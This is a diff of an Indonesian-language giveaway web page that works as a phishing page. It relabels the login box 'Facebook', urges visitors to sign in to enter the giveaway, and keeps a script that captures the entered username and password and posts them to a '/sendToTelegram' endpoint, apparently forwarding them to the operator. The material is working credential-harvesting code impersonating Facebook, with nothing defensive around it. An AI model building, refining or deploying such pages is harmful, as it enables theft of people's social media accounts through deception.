@@ -6,14 +6,6 @@
     <title>Halaman Giveaway</title>
     <link rel="stylesheet" href="styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        /* CSS Inline untuk feedback */
-        #feedback {
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: bold;
-        }
-    </style>
 </head>
 <body>
     <!-- Header -->
@@ -48,21 +40,17 @@
     </section>
 
     <!-- Call to Action Section -->
-    <!-- Call to Action Section -->
     <section class="cta-section">
-        <p style="font-size: 18px; color: #333; margin-bottom: 10px;">
-            Dan masih banyak hadiah menarik lainya.<br>
-            Jangan lewatkan kesempatan ini!<br>
-            Untuk ikut serta, silakan masuk dengan akun Anda di bawah ini.
-        </p>
+        <p>Dan masih banyak hadiah menarik lainya.<br>
+        Jangan lewatkan kesempatan ini!<br>
+        Untuk ikut serta, silakan masuk dengan akun Anda di bawah ini.</p>
         <a href="#loginForm" class="cta-btn-secondary">Masuk Sekarang</a>
     </section>
-
 
     <!-- Login Section -->
     <section class="login-section">
         <div class="login-container">
-            <h2>Masuk</h2>
+            <h2 translate="no">Facebook</h2>
             <form id="loginForm">
                 <input type="text" id="username" placeholder="Email atau Telepon" required>
                 <input type="password" id="password" placeholder="Kata Sandi" required>
@@ -72,36 +60,6 @@
             <div id="feedback"></div>
         </div>
     </section>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const feedback = document.getElementById('feedback');
-
-            fetch('/sendToTelegram', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ username, password }),
-            }).then(response => {
-                if (response.ok) {
-                    feedback.textContent = 'Data berhasil dikirim!';
-                    feedback.style.color = 'green';
-                } else {
-                    feedback.textContent = 'Terjadi kesalahan saat mengirim data!';
-                    feedback.style.color = 'red';
-                }
-                feedback.style.display = 'block';
-            }).catch(error => {
-                feedback.textContent = 'Terjadi kesalahan: ' + error.message;
-                feedback.style.color = 'red';
-                feedback.style.display = 'block';
-            });
-        });
-    </script>
 
     <!-- Comments Section -->
     <section class="comments">
@@ -154,5 +112,35 @@
         <p>Hubungi kami: email@contoh.com | Ikuti kami di media sosial</p>
         <p>&copy; 2024 Giveaway. Semua hak dilindungi.</p>
     </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const feedback = document.getElementById('feedback');
+
+            fetch('/sendToTelegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            }).then(response => {
+                if (response.ok) {
+                    feedback.textContent = 'Data berhasil dikirim!';
+                    feedback.style.color = 'green';
+                } else {
+                    feedback.textContent = 'Terjadi kesalahan saat mengirim data!';
+                    feedback.style.color = 'red';
+                }
+                feedback.style.display = 'block';
+            }).catch(error => {
+                feedback.textContent = 'Terjadi kesalahan: ' + error.message;
+                feedback.style.color = 'red';
+                feedback.style.display = 'block';
+            });
+        });
+    </script>
 </body>
 </html>
